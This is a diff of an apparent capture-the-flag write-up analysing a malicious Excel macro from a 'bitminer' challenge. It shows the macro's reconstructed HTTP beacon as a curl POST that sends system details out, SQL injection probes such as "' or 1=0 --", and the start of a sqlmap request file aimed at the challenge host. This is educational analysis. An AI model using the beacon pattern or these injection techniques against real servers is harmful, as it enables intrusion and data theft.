@@ -54,7 +54,7 @@ End Function
 ```
 
 We skip the obfuscated components to focus on the important behavior: it creates a file into the `%userprofile%` folder and runs it. We defang the macro by removing the 'Shell' line, open the Excel file and retrieve the 'bitcoin.txt' file it created. Running it in a controlled environment, we see it uses WMI to gather information about the system on which it runs and generates HTTP requests that can be translated into the following `curl` command:
-```
+```shell
 curl -i -X 'POST' \
     -H 'User-Agent: Bitcoin Mining $couter 0.1 Beta 1337' -H 'Expect: 100-continue' \
     --data '<Base64-encoded string>' \
@@ -62,7 +62,7 @@ curl -i -X 'POST' \
 ```
 
 The decoded Base64 is a JSON object with the following format:
-```
+```json
 {
     "cid":"NOT-A-SANDBOX",
     "cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz",
@@ -74,7 +74,7 @@ After playing with the JSON contents, we identify that the server generates an e
 * `' or 1=0 --` always false, returns `pwaaa`
 
 Since we are lazy hackers, we use sqlmap to extract the database contents. To do so, we use the `-r` option to define a file containing all of the request information (`*` is used to mark the injection point):
-```
+```shell
 $ cat raw_request
 POST /?a=benchmark HTTP/1.1
 Host: bitminer.insomni.hack
